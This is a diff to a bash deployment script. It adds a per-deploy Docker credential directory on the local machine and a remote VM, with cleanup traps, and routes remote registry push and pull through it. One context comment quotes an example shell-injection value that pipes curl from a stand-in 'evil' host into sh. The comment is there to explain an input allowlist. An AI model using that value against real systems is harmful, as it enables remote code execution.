@@ -169,6 +169,63 @@ log()  { printf '%s==>%s %s\n' "${GREEN}" "${RESET}" "$*"; }
 warn() { printf '%s!!%s %s\n'  "${YELLOW}" "${RESET}" "$*" >&2; }
 fail() { printf '%sxx%s %s\n'  "${RED}"    "${RESET}" "$*" >&2; exit 1; }
 
+# A deploy/login owns one private Docker credential directory for its complete
+# lifetime.  The Vault login subprocess writes config.json here; subsequent
+# local Docker processes inherit DOCKER_CONFIG, while remote Docker commands
+# receive the same path explicitly because each ssh invocation is a new shell.
+ACX_DEPLOY_OCIR_CONFIG_DIR=""
+ACX_DEPLOY_OCIR_REMOTE_CONFIG=0
+ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=0
+
+cleanup_deploy_ocir_docker_config() {
+  local rc=$? config_dir="${ACX_DEPLOY_OCIR_CONFIG_DIR:-}"
+  trap - EXIT HUP INT TERM
+  if [[ -n "${config_dir}" ]]; then
+    if [[ "${ACX_DEPLOY_OCIR_REMOTE_CONFIG:-0}" == "1" ]]; then
+      ssh -o BatchMode=yes -o ConnectTimeout=5 -o ConnectionAttempts=1 \
+        -o ServerAliveInterval=2 -o ServerAliveCountMax=2 \
+        -l "${OCI_USER}" -- "${OCI_HOST}" \
+        "rm -rf -- '${config_dir}'" >/dev/null 2>&1 || true
+    fi
+    rm -rf -- "${config_dir}"
+  fi
+  ACX_DEPLOY_OCIR_CONFIG_DIR=""
+  ACX_DEPLOY_OCIR_REMOTE_CONFIG=0
+  ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=0
+  unset ACX_OCIR_DOCKER_CONFIG_DIR DOCKER_CONFIG
+  return "${rc}"
+}
+
+init_deploy_ocir_docker_config() {
+  if [[ -n "${ACX_DEPLOY_OCIR_CONFIG_DIR}" ]]; then
+    return 0
+  fi
+  umask 077
+  ACX_DEPLOY_OCIR_CONFIG_DIR="$(mktemp -d "${TMPDIR:-/tmp}/acx-ocir-deploy.XXXXXX")" \
+    || fail "Could not create the deploy-scoped Docker credential directory"
+  ACX_OCIR_DOCKER_CONFIG_DIR="${ACX_DEPLOY_OCIR_CONFIG_DIR}"
+  DOCKER_CONFIG="${ACX_DEPLOY_OCIR_CONFIG_DIR}"
+  export ACX_OCIR_DOCKER_CONFIG_DIR DOCKER_CONFIG
+  trap cleanup_deploy_ocir_docker_config EXIT
+  trap 'exit 129' HUP
+  trap 'exit 130' INT
+  trap 'exit 143' TERM
+}
+
+init_remote_ocir_docker_config() {
+  init_deploy_ocir_docker_config
+  if [[ "${ACX_DEPLOY_OCIR_REMOTE_CONFIG}" == "1" ]]; then
+    return 0
+  fi
+  # Arm cleanup before the create attempt: ssh may create the directory and
+  # still return non-zero (for example, if a following chmod fails).
+  ACX_DEPLOY_OCIR_REMOTE_CONFIG=1
+  if ! ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "umask 077; if [ ! -d '${ACX_DEPLOY_OCIR_CONFIG_DIR}' ]; then mkdir -- '${ACX_DEPLOY_OCIR_CONFIG_DIR}'; fi; chmod 700 '${ACX_DEPLOY_OCIR_CONFIG_DIR}'"; then
+    fail "Could not create remote deploy-scoped Docker credential directory on ${SSH_TARGET}"
+  fi
+}
+
 # D1: refuse shell/ssh metacharacters before any remote interpolation. Quoting is not enough —
 # a value like x';curl evil|sh;' closes a single-quoted ssh fragment and runs as ubuntu on the VM.
 # Allowlist: empty OR ^[A-Za-z0-9_./-]+$ (docker target / tag / short name / remote path safe set).
@@ -415,10 +472,10 @@ preflight_docker() {
 # still looked healthy here and failed at push, which is exactly the "the one
 # resource nobody checked is where it fails late" trap.
 #
-# The new form performs the real login against a freshly fetched Vault token, so
-# a green preflight means the push will authenticate. Failures are classified
-# (system vs application) so the operator is routed to the one thing that broke
-# instead of re-deriving it from an opaque "auth missing".
+# The new form performs the real login against a freshly fetched Vault token in
+# the deploy-scoped DOCKER_CONFIG subsequently used by push and pull. A green
+# preflight guarantees that those later processes receive the authenticated
+# config; registry-side rejection can still occur after the preflight.
 ocir_login_or_fail() {
   local scope="$1" out rc=0
   shift
@@ -439,6 +496,7 @@ ocir_login_or_fail() {
 
 preflight_ocir_auth() {
   local snippet
+  init_deploy_ocir_docker_config
   snippet="$(ocir_login_snippet "${ACX_LOCAL_OCI_BIN}" api_key "${OCIR_REGISTRY}")"
   ocir_login_or_fail "laptop" bash -c "$snippet"
 }
@@ -458,10 +516,15 @@ preflight_remote_ocir_auth() {
   # the snippet is fed to `bash -s` over stdin rather than interpolated into
   # argv. The here-string binds to the function call; ssh inherits that stdin.
   local snippet
+  if [[ "${ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED}" == "1" ]]; then
+    return 0
+  fi
+  init_remote_ocir_docker_config
   snippet="$(ocir_login_snippet "${ACX_REMOTE_OCI_BIN}" instance_principal "${OCIR_REGISTRY}")"
   ocir_login_or_fail "${SSH_TARGET}" \
     ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
       'bash -s' <<<"$snippet"
+  ACX_DEPLOY_OCIR_REMOTE_AUTHENTICATED=1
 }
 preflight_rsync() {
   command -v rsync >/dev/null 2>&1 || fail "rsync not found in PATH (required for remote-build mode)"
@@ -734,7 +797,8 @@ do_build_remote() {
 _push_ref() {
   local ref="$1"
   if [[ "${REMOTE_BUILD}" == "1" ]]; then
-    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker push ${ref}"
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "DOCKER_CONFIG='${ACX_DEPLOY_OCIR_CONFIG_DIR}' docker push ${ref}"
   else
     docker push "${ref}"
   fi
@@ -1193,6 +1257,10 @@ do_boot_smoke() {
   poll_interval=2
   attempts=$(( (smoke_timeout + poll_interval - 1) / poll_interval ))
   log "Pre-promote boot smoke: ${image} on ${SSH_TARGET} (env=${env}, health_budget=${smoke_timeout}s, real entrypoint)"
+  # A local build authenticated the workstation for its push, not the VM. The
+  # smoke pull is a separate remote process and needs the remote half of this
+  # deploy's credential config before it can materialise the candidate.
+  preflight_remote_ocir_auth
   # S2-A-09: VLM/local-build path still pulls layers onto the VM here — consult
   # free-space floor before docker pull (same OPS-1 guard as remote build).
   assert_remote_disk_headroom_for_pull
@@ -1202,7 +1270,7 @@ do_boot_smoke() {
   # fail-fast (validate_required_secrets / validate_oci_vault_boot) no-ops — this
   # gate proves the image IMPORTS, not that prod secrets are configured (that is
   # Gate 2, which uses the deployed .env + real entrypoint).
-  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker pull ${image} >/dev/null && docker run --rm -e RECOGNITION_RUNTIME_MODE=development --entrypoint python ${image} -c 'import api.main'"; then
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "DOCKER_CONFIG='${ACX_DEPLOY_OCIR_CONFIG_DIR}' docker pull ${image} >/dev/null && docker run --rm -e RECOGNITION_RUNTIME_MODE=development --entrypoint python ${image} -c 'import api.main'"; then
     warn "boot smoke: 'import api.main' failed on ${image} (packaging/import error)"
     return 1
   fi
@@ -1357,9 +1425,12 @@ do_restart() {
   # A-11: pull materialises layers on the VM — free-space floor for VLM.
   assert_remote_disk_headroom_for_pull
   # Pull first so the repair service image matches the about-to-restart stack.
+  # This also covers ACX_BOOT_SMOKE=0, where the earlier remote pull/login was
+  # deliberately skipped.
+  preflight_remote_ocir_auth
   log "Pulling ${ACX_IMAGE_REPO} on ${SSH_TARGET}"
   # shellcheck disable=SC2086
-  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd ${remote_dir} && docker compose ${compose_files} pull api"; then
+  if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "cd ${remote_dir} && DOCKER_CONFIG='${ACX_DEPLOY_OCIR_CONFIG_DIR}' docker compose ${compose_files} pull api"; then
     warn "compose pull api failed on ${env}"
     return 1
   fi
@@ -1386,6 +1457,8 @@ do_deploy() {
     converge_check "$env"
     return 0
   fi
+
+  init_deploy_ocir_docker_config
 
   local tag sha
   tag="$(env_to_tag "$env")"
@@ -1438,6 +1511,7 @@ do_deploy() {
 #---------------------------------------------------------------- promote
 do_promote() {
   local from_env="$1" to_env="$2"
+  init_deploy_ocir_docker_config
   # Fail closed: dev-fir shares the :dev image tag with acx-dev (env_to_tag maps
   # both to "dev"). Promoting to dev-fir would retag the SHARED :dev image and
   # only restart acx-dev-fir — blast radius onto acx-dev identity, incomplete
@@ -1468,7 +1542,7 @@ do_promote() {
     # A-11: promote remote branch materialises layers — same free-space floor.
     assert_remote_disk_headroom_for_pull
     log "Pulling source image ${IMAGE_BASE}:${from_tag} on ${SSH_TARGET}"
-    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker pull ${IMAGE_BASE}:${from_tag}"
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "DOCKER_CONFIG='${ACX_DEPLOY_OCIR_CONFIG_DIR}' docker pull ${IMAGE_BASE}:${from_tag}"
   else
     preflight_docker
     preflight_ocir_auth
@@ -1482,7 +1556,7 @@ do_promote() {
 
   if [[ "${REMOTE_BUILD}" == "1" ]]; then
     log "Tagging ${from_tag} -> ${to_tag} on ${SSH_TARGET}"
-    if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker tag ${IMAGE_BASE}:${from_tag} ${IMAGE_BASE}:${to_tag} && docker push ${IMAGE_BASE}:${to_tag}"; then
+    if ! ssh -l "${OCI_USER}" -- "${OCI_HOST}" "docker tag ${IMAGE_BASE}:${from_tag} ${IMAGE_BASE}:${to_tag} && DOCKER_CONFIG='${ACX_DEPLOY_OCIR_CONFIG_DIR}' docker push ${IMAGE_BASE}:${to_tag}"; then
       restore_prior_image_repo_env
       fail "Remote tag/push failed after shipping ACX_IMAGE_REPO; prior sticky repo restored where possible."
     fi
